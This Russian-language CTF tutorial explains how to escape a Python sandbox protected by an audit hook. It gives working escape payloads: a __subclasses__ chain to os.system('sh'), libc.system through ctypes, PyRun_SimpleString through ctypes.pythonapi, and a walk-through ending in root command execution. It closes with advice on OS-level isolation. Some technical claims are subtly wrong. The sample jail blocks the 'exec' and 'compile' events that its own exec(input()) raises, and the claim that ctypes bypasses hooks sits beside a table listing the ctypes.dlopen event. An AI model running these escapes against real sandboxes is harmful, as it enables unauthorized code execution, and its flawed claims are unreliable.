## Вопрос, с которого всё начинается

Простые pyjail мы уже проходили: чёрный список слов, обход через рефлексию. Но этот джейл устроен серьёзнее — на Python 3.11 стоит **аудит-хук**, который перехватывает опасные операции. Простая подмена имён не поможет: важно не «как назвать функцию», а «какое событие она порождает». Что остаётся, когда фильтр стал системным?

## Наш пример: песочница с аудит-хуком

Условие даёт код сервиса:

```python
import sys
def hook(event, args):
    if event in ('exec', 'compile', 'os.system', 'subprocess.Popen', 'open'):
        raise RuntimeError('blocked')
sys.addaudithook(hook)
exec(input(">>> "))
```

Хук падает на событиях `exec`, `compile`, `os.system`, `subprocess.Popen`, `open`. То есть даже если мы получим `os.system`, само событие будет заблокировано. Нужен путь, который **не порождает** перехватываемого события.

## Шаг 1: три модели изоляции Python

Прежде чем искать дыру, определим модель. Разработчики обычно выбирают одно из:

1. **чёрный список** — запрет `eval`, `exec`, `import`, `os`, `open`;
2. **ограничение builtins** — пустое `__builtins__` и явный список разрешённых функций;
3. **аудит-хуки** — `sys.addaudithook` перехватывает операции (Python 3.8+).

Наш случай — третий. Обход у каждой модели свой, и понимание разницы — половина успеха.

## Шаг 2: обход чёрного списка (для сравнения)

Если бы фильтр был по словам, работала бы цепочка от объектной модели:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
```

`catch_warnings` даёт доступ к `__builtins__` через `_module`. Если фильтр запрещает подстроки — собираем имена динамически:

```python
getattr(().__class__, '__ba'+'se__')
```

Но в нашем джейле хук перехватит `os.system` независимо от того, как мы его назвали. Поэтому идём дальше.

## Шаг 3: ctypes — выход на нативный уровень

`ctypes` — прямой мост к libc, и его часто **не блокируют**. Вызов идёт через нативный код, минуя Python-события:

```python
import ctypes
libc = ctypes.CDLL(None)
libc.system(b'cat /flag')
```

`ctypes.CDLL(None)` открывает основной образ процесса, а `system` из libc делает системный вызов напрямую. Аудит-хук Python здесь не срабатывает: он видит события **интерпретатора**, а не нативные вызовы. Это самый надёжный путь, если `ctypes` доступен.

Через `ctypes` можно вызвать `system`, `execve`, `open`, `read` — то есть обойти любой запрет на Python-уровне.

## Шаг 4: что ещё не покрыто хуком

Аудит-хуки — это фильтр на **события**, а не песочница. Проходит всё, что не порождает покрытого события:

- **уже скомпилированный код** — если передать байткод или объект-функцию, выполнение не порождает события `compile`;
- **доступ через `ctypes`** — нативные вызовы не видны хуку;
- **некоторые способы чтения файлов** — memory-mapped файлы, доступ через libc;
- **атака на сам механизм хуков** через недокументированные внутренние структуры.

Печатайте доступные модули: `print(list(sys.modules))` — иногда `os` остаётся под другим именем.

## Шаг 5: если `ctypes` убран

Ищем другие нативные мосты:

- `_ctypes` — внутренний модуль, если `ctypes` вырезали, а его забыли;
- `cffi` — альтернативный мост к C;
- `mmap` — прямой доступ к памяти;
- `ctypes.pythonapi` — позволяет звать внутренние функции CPython и выполнять код в обход ограничений.

```python
import ctypes
ctypes.pythonapi.PyRun_SimpleString(b'import os; os.system("cat /flag")')
```

`pythonapi` — это мост к самому интерпретатору: через него исполняют код в обход фильтров, наложенных на текущий контекст.

## Шаг 6: исследование песочницы методично

1. Определите версию Python и включённые хуки.
2. Составьте список примитивов: `open`, `eval`, `exec`, `compile`, `__import__`, `ctypes`, `subprocess`, `os`.
3. Для каждого отметьте доступ: напрямую, косвенно (через `__globals__`) или нативно (через `ctypes`).

5. Печатайте `sys.modules` — иногда `os` живёт под другим именем.

## Шаг 7: если не сработало

- **Забыли про `ctypes`.** Это самый короткий путь к RCE.
- **Фильтр по подстрокам.** Обходится конкатенацией и `chr`.
- **Путаете `eval`/`exec`/`compile`.** У каждого свои события.
- **Не смотрите traceback.** Он подсказывает доступные имена и пути.
- **Игнорируете версию.** Аудит-хуки есть только с 3.8.

## Практический пример: обход хука через уже скомпилированный код

Разберём ещё один путь. Пусть аудит-хук падает на `compile` и `exec`, но задача даёт возможность передать **сериализованный объект**, который сервер загружает. Если загрузка происходит без события `compile` (например, через `pickle` уже скомпилированной функции), выполнение пройдёт мимо хука.

Другой распространённый путь — `ctypes` с вызовом `system` из libc, как в примере выше. Здесь важно, что хук видит **события интерпретатора**, а `libc.system` — это нативный вызов, о котором Python не сообщает. Поэтому в песочнице, где «всё опасно» заблокировано на уровне Python, но оставлен `ctypes`, побег тривиален.

Проверить доступность просто:

```python
print('ctypes' in __import__('sys').modules)
```

Если модуль загружен или импортируем — используйте его. Если нет — ищите `_ctypes`, `cffi`, `mmap`. И помните про `ctypes.pythonapi`: он позволяет звать внутренние функции CPython, что иногда обходит и ограничения на сам `ctypes`.

## Что мы теперь знаем

По-простому:

1. Сначала определите модель изоляции: чёрный список, пустые builtins или аудит-хуки.
2. Для первых двух работает цепочка `__subclasses__` → `__globals__` → `__builtins__`.
3. Аудит-хуки перехватывают **события интерпретатора**, а не нативные вызовы.
4. `ctypes` и `ctypes.pythonapi` дают нативный путь в обход хука.
5. Надёжная изоляция Python требует отдельного процесса с ограничениями ОС.

- **Проверяйте нативные мосты.** `ctypes`, `cffi`, `mmap`, `_ctypes`.
- **Смотрите `sys.modules`.** Там может остаться `os`.
- **Читайте traceback.** Он раскрывает пути и имена.

## Справочник: аудит-хуки и какие события они ловят

Аудит-хук (`sys.addaudithook`) — это механизм, которым песочница перехватывает опасные операции. Хук получает имя события и аргументы. Полезно знать, какие события вообще существуют:

| Событие | Что перехватывает |
|---|---|
| `exec` | выполнение кода (`exec`, `eval`, `compile`) |
| `import` | импорт модуля |
| `open` | открытие файла |
| `os.system` | запуск команды через `os.system` |
| `subprocess.Popen` | запуск процесса |
| `ctypes.dlopen` | загрузка нативной библиотеки |
| `socket.__new__` | создание сокета (сеть) |
| `builtins.input` | чтение ввода |

Видно логику защиты: она закрывает и «выполнить код», и «выйти наружу» (файл, процесс, сеть, нативная библиотека). Дыра почти всегда там, где событие не покрыто.

## Мини-практика: обход без ctypes через объектную модель

Если `ctypes` убран, но аудит-хук неполный, работает классический выход через объектную модель. Любой объект в Python знает свой класс, а через `__subclasses__` можно дойти до классов, дающих доступ к системе:

```
>>> ().__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, ..., <class 'os._wrap_close'>, ...]
```

Дальше через найденный класс достают `__init__.__globals__` и оттуда — нужные функции. Ключевая мысль: **песочница должна закрывать не имена, а доступ к объектам**, иначе `__subclasses__` возвращает всё, что загружено.

## Частые ошибки

- **Фильтровать по именам.** Чёрный список слов (`eval`, `exec`) обходится через `getattr` и конкатенацию.
- **Забыть про `__subclasses__`.** Даже без `ctypes` объектная модель даёт доступ к уже загруженным модулям.
- **Не покрыть сеть.** Забытое событие `socket.__new__` открывает эксфильтрацию.
- **Оставлять `__builtins__`.** Полный доступ к встроенным функциям ломает любую изоляцию.

## Мини-практика: полный побег по шагам

Соберём побег из неполной песочницы в одну историю:

1. **Разведка.** Пробуем `print(dir(__builtins__))` — видим, что осталось.
2. **Поиск класса.** `[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen']`.
3. **Выход на модуль.** У найденного класса берём `__init__.__globals__` и ищем там `os` или `sys`.
4. **Команда.** Через найденный модуль вызываем `os.system('id')`.
5. **Проверка.** Читаем вывод: `uid=0(root)` — песочница пройдена.

Каждый шаг — «достать ссылку на уже загруженный объект». Если песочница не вырезала объектную модель, путь всегда находится.

## Что на самом деле защищает

Настоящая изоляция не в фильтрах имён, а в разрыве доступа:

- **Отдельный процесс** с минимальными правами.
- **seccomp** с белым списком сисколлов (а не чёрным).
- **Отдельный пользователь** без прав на файлы.
- **Отсутствие сети** (или только к нужным адресам).
- **Лимиты ресурсов** (память, время, дескрипторы).

Правило простое: **песочница на уровне языка — это удобство, а песочница на уровне ОС — это безопасность**.
